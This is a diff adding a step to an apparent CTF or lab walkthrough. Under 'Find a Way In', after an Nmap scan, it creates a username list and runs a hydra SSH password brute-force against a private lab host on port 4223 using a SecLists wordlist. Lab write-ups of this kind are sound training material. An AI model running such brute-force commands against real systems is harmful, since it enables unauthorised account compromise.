@@ -94,7 +94,19 @@ Nmap done: 1 IP address (1 host up) scanned in 1388.52 seconds
 ## 5. Step 3 — “Find a Way In”
 ![image](https://github.com/user-attachments/assets/eaa17001-496e-42c0-8ea2-7f0e67ebb270)
 
+```bash
+cat <<EOF > usernames.txt
+rrf-control
+admin
+root
+trinity
+neo
+EOF
+```
 
+```bash
+ hydra -L usernames.txt -P /SecLists/Passwords/xato-net-10-million-passwords-1000.txt -t 4 -vV ssh://192.168.23.42 -s 4223
+```
 
 
 
